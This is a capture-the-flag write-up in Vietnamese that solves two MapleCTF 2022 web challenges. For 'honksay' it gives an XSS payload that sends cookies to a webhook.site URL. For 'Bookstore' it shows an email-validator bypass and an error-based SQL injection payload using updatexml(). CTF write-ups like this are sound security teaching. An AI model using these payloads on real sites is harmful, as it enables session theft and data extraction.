# MAPLECTF 2022

## honksay

Challange cho ta một trang web có thể nhập input để phàn nàn nếu con ngỗng có nói bậy :v 

Ngoài ra challange còn cung cấp cho ta source code, sau khi tải file .gz và giải nén ta dùng docker để khởi tạo challange trên local

Sau khi khởi tạo challenge sẽ chạy ở port 9988 

Ngắm ngía một chút source code có thể để ý thấy điều này:
```html
    ${goosemsg === '' ? '': `<h1> ${goosemsg} </h1>`}
    <img src='/images/goosevie.png' width='400' height='700' class='center'></img>
    ${goosecount === '' ? '': `<h1> You have honked ${goosecount} times today </h1>`}

    <form action="/report" method=POST style="text-align: center;">
        <label for="url">Did the goose say something bad? Give us feedback.</label>
        <br>
        <input type="text" id="site" name="url" style-"height:300"><br><br>
        <input type="submit" value="Submit" style="color:black">
    </form>
</html>
```
Hai biến goosemsg và goosecount sẽ được inject vào html nên ta sẽ thử dùng XSS để exploit. Và giá trị 2 biến này tương ứng với honk và honkcount trong cookie

Nhìn thêm vào source code ta thấy có đường dẫn **/changehonk** nhận querry string là newhonk và gán honk = newhonk
```javascript
app.get('/changehonk', (req, res) => {
    res.cookie('honk', req.query.newhonk, {
        httpOnly: true
    });
    res.cookie('honkcount', 0, {
        httpOnly: true
    });
    res.redirect('/');
});
```
Tóm lại ta chỉ cần thay đổi được giá trị của honk trong cookie thành payload XSS, để làm được điều đó thì ta lợi dụng logic của **/changehonk** 

Từ đó ta có payload:
```bash
http://localhost:9988/changehonk?newhonk[message]=<script>var i = new Image; i.src="https://webhook.site/b4f4ffa4-09ab-4ea7-8b1f-949b5902691c/?"+document.cookie;</script>

URL Encode:
http://localhost:9988/changehonk?newhonk[message]=%3Cscript%3Evar%20i%20%3D%20new%20Image%3B%20i.src%3D%22https%3A%2F%2Fwebhook.site%2Fb4f4ffa4-09ab-4ea7-8b1f-949b5902691c%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
```

Ở đây ta dùng [webhook](https://webhook.site/) để nhận request có chứa cookie gửi về từ challange (thay url webhook trong payload bằng url webhook của bạn)


Tuy nhiên ta không nhận về được flag  
![web-hook-no-flag](web-hook-no-flag.png)

Nhìn thêm vào source code ta thấy **/report** có gọi tới hàm visit trong file goose.js
```javascript
app.post('/report', (req, res) => {
    const url = req.body.url;
    goose.visit(url);
    res.send('honk');
});
```
Hàm visit trong goose.js
```javascript
const puppeteer = require('puppeteer');
const FLAG = process.env.FLAG || "maple{fake}";

async function visit(url) {
  let browser, page;
  return new Promise(async (resolve, reject) => {
    try {
      browser = await puppeteer.launch({
        headless: true,
        args: [
          '--no-sandbox',
          '--disable-default-apps',
          '--disable-dev-shm-usage',
          '--disable-extensions',
          '--disable-gpu',
          '--disable-sync',
          '--disable-translate',
          '--hide-scrollbars',
          '--metrics-recording-only',
          '--mute-audio',
          '--no-first-run',
          '--safebrowsing-disable-auto-update'
                ]
            });
        page = await browser.newPage();
        await page.setCookie({
            name: 'flag',
            value: FLAG,
            domain: 'localhost',
            samesite: 'none'
        });
        await page.goto(url, {waitUntil : 'networkidle2' }).catch(e => console.log(e));
        console.log(page.cookies());
        await new Promise(resolve => setTimeout(resolve, 500));
        console.log("admin is visiting url:");
        console.log(url);
        await page.close();
        
        console.log("admin visited url");
        page = null;
    } catch (err){
        console.log(err);
    } finally {
        if (page) await page.close();
        console.log("page closed");
        if (browser) await browser.close();
        console.log("browser closed");
        //no rejectz
        resolve();
        console.log("resolved");
    }
  });
};


module.exports = { visit }
```
Ta có thể tạm hình dung hàm vist sẽ nhận para là url sau đó set cookie tên là flag (cái ta đang tìm) và cuối cùng thực hiện duyệt web tới url với cookie được set

Vậy để lấy được flag ta sẽ truyền payload đã nêu ở trên vào param url của **/report** thông qua methods POST. Khi hàm visit thực thi, payload sẽ gửi request cho [webhook](https://webhook.site/) với cookie lúc này đã có flag
![burp-suit-img](burp-suit-img.png)
![fake-flag.png](fake-flag.png)

Cuối cùng ta thực hiện exploit trong challange thay vì local để lấy flag. Tuy nhiên payload sẽ vẫn có url là **http://localhost:9988/......**. Vì domain đã được khai báo là "localhost" trong hàm visit 
```javascript
page = await browser.newPage();
        await page.setCookie({
            name: 'flag',
            value: FLAG,
            domain: 'localhost',
            samesite: 'none'
        });
```
![real-flag.png](real-flag.png)
> **_FLAG:_**  maple{g00segoHONK}


## Bookstore

Challange cho ta 1 trang web và source code. Ta có thể dựng lại challenge  bằng docker

Truy cập vào trang web của challange có 1 form login và register

Sau khi đăng ký ta tiến hành login sẽ hiển thị 1 danh sách các sách để purchase. Purchase xong ta có thể cung cấp email để download sách về

Khi đọc source code ta thấy:
```javascript
app.post('/download-ebook', (req, res) => {
    const option = req.body?.option ?? '';
    const email = req.body?.email ?? '';
    const bookID = req.body?.bookID ?? 1;
    const user = req.session?.user ?? { books: [] };
    if (!validBooks.find(book => book.id == bookID)) {
        res.send('Invalid book ID');
        return;
    } /* else if (!user.books.includes(bookID)) {
        res.send('You do not have this book');
        return;
    } */

    switch (option) {
        case 'direct':
            res.write('Direct downloads currently unavailable. Please wait until the established publish date!');
            break;
        case 'kindle':
            if (validateEmail(email)) {
                db.insertEmail(email, bookID).then((err) => {
                    if (err) {
                        res.send('Error: ' + err);
                    } else {
                        res.send("Email saved! We'll send you a download link once the book has been published!")
                    }
                }).catch((err) => {
                    res.send('Error: ' + err);
                })
            } else {
                res.send("Invalid email address")
            }
            break;
        default:
            res.send('Invalid option');
            break;
    }
});
```
**/download-ebook** sẽ dùng hàm insertEmail() từ db.js

Hàm insertEmail():
```javascript
insertEmail(email, book_id) {
        const query = `INSERT INTO requests(email, book_id) VALUES('${email}', '${book_id}');`;
        return new Promise((resolve, reject) => {
            this.db.query(query, (error) => {
                if (error != null) {
                    reject(error);
                } else {
                    resolve(null);
                }
            })
        })
    }
```
Ta có thể lợi dụng hàm này để truyền vào payload thực hiện SQL injection thông qua việc input email

Đầu tiên challange có validate email bằng hàm [isEmail](https://github.com/validatorjs/validator.js/blob/master/src/lib/isEmail.js) nên ta cần phải bypass, trong source code của [isEmail](https://github.com/validatorjs/validator.js/blob/master/src/lib/isEmail.js)ta thấy dòng code sau:
```javascript
 if (user[0] === '"') {
    user = user.slice(1, user.length - 1);
    return options.allow_utf8_local_part ?
      quotedEmailUserUtf8.test(user) :
      quotedEmailUser.test(user);
  }
```
Ta có thể dùng " ' để bypass

Nhìn qua file **init.sql** ta sẽ thấy flag được lưu trong table **books**
```mysql
INSERT INTO books(title, author, price, texts) VALUES('Maple Stories', 'Maple-Chan', 0, 'FLAGE');
```
Ta sẽ dùng [updatexml()](https://clbuezzz.wordpress.com/2021/12/28/xpath-error-based-injection-using-extractvalue-update-xml/) để thực hiện error-base sqli để đọc được flag
>**_updatexml()_**: là hàm sẽ thực hiện truy vấn XPath với một chuỗi đại diện cho data XML, trong đó param đầu tiên sẽ là XML data nếu nó sai syntax thì sẽ xuất hiện error message với param thứ 2 sẽ được thực thi

>**_XPATH_**: [XML Path Language](https://www.w3schools.com/xml/xml_xpath.asp) được sử dụng để 
điều hướng qua các elements và attributes trong tài liệu XML

Payload:
```bash
"',updatexml(1,concat(1,(select texts from books limit 1)),1))#@c.cc
```
Trong đó:
- " ' và #@c.cc để bypass qua email validation
- concat(1,(select texts from books limit 1)) để đọc flag từ table books

Kết quả:
![sqli-flag.png](spli-flag.png)
>**_Flag:_** maple{it_was_all_just_maple_leaf}